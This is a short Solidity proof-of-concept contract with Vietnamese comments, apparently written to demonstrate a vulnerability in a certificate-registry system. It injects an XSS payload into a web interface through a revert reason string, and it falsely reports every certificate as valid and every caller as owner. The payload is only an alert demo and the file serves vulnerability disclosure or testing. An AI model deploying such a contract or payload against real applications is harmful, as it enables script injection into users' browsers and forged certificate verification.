// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title EvilRegistry — contract GIẢ dùng để chứng minh lỗ hổng, KHÔNG phải một phần của hệ thống.
/// @notice Mô phỏng kịch bản: kẻ tấn công gửi cho nạn nhân một địa chỉ contract do mình kiểm soát
///         rồi dùng chính chuỗi revert để chèn mã vào giao diện.

contract EvilRegistry {
    // Payload do kẻ tấn công toàn quyền chọn: chuỗi tùy ý, không bị hệ điều hành
    // hay trình duyệt giới hạn ký tự như tên tệp.
    string public constant PAYLOAD = "<img src=x onerror=\"alert('XSS')\">";

    function owner() external view returns (address) { return msg.sender; }
    function isIssuer(address) external pure returns (bool) { return true; }

    /// @notice Luôn revert, mang theo payload trong chuỗi lý do.
    function issueCertificate(bytes32, bytes32, address) external {
        revert(PAYLOAD);
    }

    /// @notice Trả về "hợp lệ" cho mọi tệp.
    function verifyCertificate(bytes32, bytes32)
        external pure returns (bool, uint8, address, address, uint256)
    {
        return (true, 1, address(0xBEEF), address(0xCAFE), 1735689600);
    }
}
